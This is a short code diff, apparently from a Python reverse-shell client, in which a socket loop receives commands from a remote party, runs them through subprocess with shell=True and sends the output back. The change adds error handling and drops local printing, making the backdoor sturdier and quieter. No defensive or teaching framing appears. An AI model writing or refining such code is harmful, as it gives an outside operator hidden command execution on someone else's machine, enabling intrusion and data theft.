@@ -11,7 +11,11 @@ s.send(platf)
 
 while True:
     comm = s.recv(1024).decode()
-    comm_execute = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        comm_execute = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except:
+        s.send("ERROR")
+    
     sdc = f"command: '{comm}' not found"
     if comm == "stop":
         sys.exit(0)
@@ -66,4 +70,3 @@ while True:
         sdc = "system: error unknown"
         
     s.send(sdc.encode())
-    print(sdc)
